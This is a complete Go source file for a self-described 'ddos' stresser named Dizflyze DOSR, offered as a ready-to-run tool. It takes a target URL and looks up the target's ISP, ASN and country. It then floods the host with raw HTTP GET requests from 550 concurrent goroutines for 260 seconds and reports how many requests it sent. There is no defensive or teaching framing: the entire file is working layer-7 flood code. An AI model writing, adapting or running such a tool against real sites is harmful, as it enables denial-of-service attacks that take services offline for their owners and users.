package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var (
	totalReq    int64
	concurrency = 550
	startTime   = time.Now()
)

const (
	P = "\033[0m"
	R = "\033[31m"
	G = "\033[32m"
	Y = "\033[33m"
	C = "\033[36m"
)

func banner() {
	fmt.Println(P + `
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣀⡠
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣧
⠀⠀⠀⠀⠀⠀⠈⠀⠄⠀⣀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠈ [ # ] Dizflyze
⠀⠀⠀⠀⢀⣁⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢋⣭⡍⣿⣿⣿⣿⣿⣿⠐ [ # ] DOSR
⠀⢀⣴⣶⣶⣝⢷⡝⢿⣿⣿⣿⠿⠛⠉⠀⠂⣰⣿⣿⢣⣿⣿⣿⣿⣿⣿⡇ [ # ] v1.3.2
⢀⣾⣿⣿⣿⣿⣧⠻⡌⠿⠋⠡⠁⠈⠀⠀⢰⣿⣿⡏⣸⣿⣿⣿⣿⣿⣿⣿ [ # ] 23 JAN
⣼⣿⣿⣿⣿⣿⣿⡇⠁⠀⠀⠐⠀⠀⠀⠀⠈⠻⢿⠇⢻⣿⣿⣿⣿⣿⣿⡟
⠙⢹⣿⣿⣿⠿⠋⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⡿⠟⠁
⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
` + P)
}

func getISP(ip string) (isp, asn, country string) {
	client := &http.Client{Timeout: 4 * time.Second}
	resp, err := client.Get("http://ip-api.com/json/" + ip)
	if err != nil {
		return "Unknown", "Unknown", "Unknown"
	}
	defer resp.Body.Close()

	var data struct {
		Country string `json:"country"`
		Org     string `json:"org"`
		AS      string `json:"as"`
	}

	if err := json.NewDecoder(resp.Body).Decode(&data); err != nil {
		return "Unknown", "Unknown", "Unknown"
	}
	return data.Org, data.AS, data.Country
}

func resolveIP(host string) string {
	ips, err := net.LookupIP(host)
	if err != nil || len(ips) == 0 {
		return "Unknown"
	}
	return ips[0].String()
}

func rawL7(host, path string, wg *sync.WaitGroup, stop <-chan struct{}) {
	defer wg.Done()
	req := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n", path, host)
	for {
		select {
		case <-stop:
			return
		default:
			conn, err := net.Dial("tcp", host+":80")
			if err != nil {
				continue
			}
			conn.Write([]byte(req))
			atomic.AddInt64(&totalReq, 1)
			conn.Close()
		}
	}
}

func parseURL(input string) (host, path string) {
	if !strings.HasPrefix(input, "http") {
		input = "http://" + input
	}
	parts := strings.Split(input, "/")
	host = strings.Split(parts[2], ":")[0]
	path = "/"
	if len(parts) > 3 {
		path += strings.Join(parts[3:], "/")
	}
	return host, path
}

func main() {
	banner()
	reader := bufio.NewReader(os.Stdin)
	fmt.Print(P + "╔═[ddos]Dizflyze Streser]\n╚═══➤ " + P)
	url, _ := reader.ReadString('\n')
	url = strings.TrimSpace(url)
	fmt.Print(P)

	host, path := parseURL(url)
	ip := resolveIP(host)
	isp, asn, country := getISP(ip)

	duration := 260 * time.Second
	stop := make(chan struct{})
	var wg sync.WaitGroup

	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go rawL7(host, path, &wg, stop)
	}

	time.Sleep(duration)
	close(stop)
	wg.Wait()

	fmt.Println(R + "\n╔════════════════════════════════════════════════╗" + P)
	fmt.Printf("%s│%s Link     : %s%s\n", R, P, Y, url)
	fmt.Printf("%s│%s Host     : %s%s\n", R, P, Y, host)
	fmt.Printf("%s│%s IP       : %s%s\n", R, P, Y, ip)
	fmt.Printf("%s│%s ISP      : %s%s\n", R, P, C, isp)
	fmt.Printf("%s│%s ASN      : %s%s\n", R, P, C, asn)
	fmt.Printf("%s│%s Country  : %s%s\n", R, P, C, country)
	fmt.Printf("%s│%s Duration : %s\n", R, P, Y, time.Since(startTime))
	fmt.Printf("%s│%s Requests : %s%d\n", R, P, G, totalReq)
	fmt.Println(R + "╚════════════════════════════════════════════════╝" + P)
}
